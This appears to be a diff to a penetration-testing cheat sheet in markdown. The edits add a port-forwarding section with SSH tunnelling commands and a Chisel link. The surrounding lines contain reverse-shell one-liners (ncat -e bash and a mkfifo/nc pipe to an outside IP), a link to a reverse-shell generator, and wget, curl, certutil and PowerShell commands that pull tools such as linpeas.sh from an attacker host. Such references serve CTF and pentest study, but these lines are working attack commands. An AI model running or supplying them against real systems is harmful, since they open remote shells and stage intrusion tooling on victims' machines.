@@ -38,14 +38,22 @@ ncat 10.11.99.141 5555 -e bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
 [Other_Reverse_Shell_Site](https://www.revshells.com/)
-# SSH Proxies
+
+# Port-Forwarding ✅
+## SSH ✡️
 ```bash
-ssh -L 7777:localhost:8888 user@192.168.0.100
-ssh -R 12340:localhost:9999 user@192.168.0.100
+ssh -L 7777:localhost:8888 user@10.10.10.10
+ssh -R 12340:localhost:9999 user@10.10.10.10
 ssh -C2qTnN -D 1080 user@target.host
 ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
 -oHostKeyAlgorithms=+ssh-rsa
 ```
+## Chisel ✡️
+```bash
+https://github.com/jpillora/chisel
+```
+[port-forwarding](https://fumenoid.github.io/posts/port-forwarding)
+
 # File_Transfer ✅
 ## linux ✅
 ```bash
@@ -54,7 +62,7 @@ wget http://10.10.10.10:8000/linpeas.sh
 curl http://10.10.10.10:8000/linpeas.sh -O linpeas.sh
 ```
 ## windows ✅
-```bash
+```bash 
 certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Public\namefile.txt
 powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/namefile.txt' -OutFile 'C:\Windows\Temp\namefile.txt'"
